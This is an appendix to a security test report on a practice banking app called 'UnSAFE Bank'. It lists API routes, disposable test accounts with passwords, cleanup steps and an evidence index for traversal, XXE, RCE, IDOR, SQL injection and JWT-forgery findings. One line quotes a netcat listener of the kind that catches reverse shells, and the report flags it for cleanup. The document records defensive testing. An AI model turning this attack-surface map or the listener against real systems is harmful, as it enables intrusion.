Service fingerprints: `:3000` nginx/1.31.6 serving a Create React App SPA ("UnSAFE Bank"); `:80` Apache/2.4.33 (Unix) with `X-Powered-By: PHP/7.2.7`, API at `/api/`, wildcard CORS on every response; `:80/` root and unknown paths → 404; `/api/` → `Welcome to UnSAFE Bank`; `/info.php` → phpinfo().

API surface recovered from the SPA's own JavaScript (routes.ts in the served source map):
`/api/login`, `/api/logout`, `/api/signup`, `/api/show`, `/api/contactUs`, `/api/otp/get`, `/api/otp/verify`,
`/api/password/forgot`, `/api/password/verifyuser`, `/api/password/reset`, `/api/password/change`,
`/api/account/details`, `/api/account/statement`, `/api/beneficiary/{list,fetch,add,delete,pay,get}`,
`/api/editUser/editUserDetails`, `/api/loan/apply`, `/api/loan`.

`ffuf` API path discovery (`web/ffuf-api.json`): existing paths `/api/login`, `/api/logout`, `/api/signup`, `/api/show`, `/api/contactUs`, `/api/account`, `/api/loan`, `/api/welcome`; unknown paths 404.

### B. Test data created during the engagement
Two disposable accounts were created through the normal signup flow and used for every state-changing test:

| Account | User id | Email | Initial password | Notes |
|---|---|---|---|---|
| A ("Alpha") | `BNK95153` | `bbalpha2609200515@bbtest.io` | `BBalpha2609200515` | Primary attacker/victim account; password reset several times and restored |
| B ("Beta") | `BNK00623` | `bbbeta2609200515@bbtest.io` | `BBbeta2609200515` | Second account used to prove IDOR (F5) and cross-user reset (F9); restored |

State restored: all balances returned to their original values (F7); B's password restored (F9); the `BOBTEST` beneficiary deleted; the RCE file self-deleted (verified 404). One loan application record and the account-statement entries created by the transfer test remain on the tester's own account A — they are inert test data and cannot be removed through the API.

### C. Artifact index (SHA-256)
189 artifacts hashed in `report/artifact-index.txt` (evidence, web captures, scans, and exploit scripts). Selected entries include the F1/F2 outputs, the OTP ciphertext and plaintext, IDOR response, SQLi extraction outputs, RCE proof, and the transfer/statement evidence.

### D. Command audit log
- `audit.log` — 41 UTC-stamped entries written by `audit.sh` wrapping each target-facing tool invocation (purpose, command, exit code).
- Exploit/test scripts under `exploit/` (`api.py`, `t*.py`, `d*.sh`, `final_checks.sh`) were executed directly and their stdout was captured to `evidence/`; each script is hashed in the artifact index. The turn log records the sequence and rationale for every step.

### E. Key evidence files
| Finding | File(s) |
|---|---|
| F1 | `evidence/f1-traversal-passwd.txt`, `f1-db-config.txt`, `f1-app-config.txt`, `f1-path-probe.log` |
| F2 | `evidence/f2-xxe-passwd.txt` |
| F3 | `evidence/otp_forgot_A*.txt`, `otp_verifyuser_A.txt`, `otp_decrypted_A.raw`, `reset_A_own.txt` |
| F4 | `evidence/f4-loan-apply-resp.txt`, `f4-rce-proof.txt` |
| F5 | `evidence/idor_A_reads_B.txt`, `details_A_own.txt` |
| F6 | `evidence/sqli_fetch_quote.txt`, `sqli_database.txt`, `sqli_version.txt`, `sqli_user.txt`, `sqli_tables_1.txt` |
| F7 | `evidence/f7-balances-*.txt`, `f7_negative_pay.txt`, `statement_A_final.txt` |
| F8 | `evidence/chmod_A_wrongold.txt` |
| F9 | `evidence/f9_reset_B_with_A_ref.txt`, `f9-proof.txt`, `exploit/f9_proof.log` |
| F11 | `evidence/f11-jwt-resign.txt`, `f11-jwt-forged-extended.txt`, `jwt_payload_A.txt` |
| F12 | `evidence/otp_verify_wrong_*.txt`, `otp_verify_correct_after_failures.txt` |
| F13 | `evidence/f13-phpinfo.html`, `f16-signup-nodevice.txt`, `web/*.map` |
| F14 | `evidence/f13-cors.txt` |
| O1 | `evidence/ssrf_*.txt`, operator image-server logs (no hits) |

### F. Operator-host hygiene note
No test listeners or background processes remain (the image server and `nc` on 8899 were stopped). One **pre-existing** listener was observed on the operator host — `nc -lvp 4444` writing to `/root/scans/catcher.log` (PID started before this engagement; not created by this test). It was left untouched and is flagged to the engagement lead for cleanup.
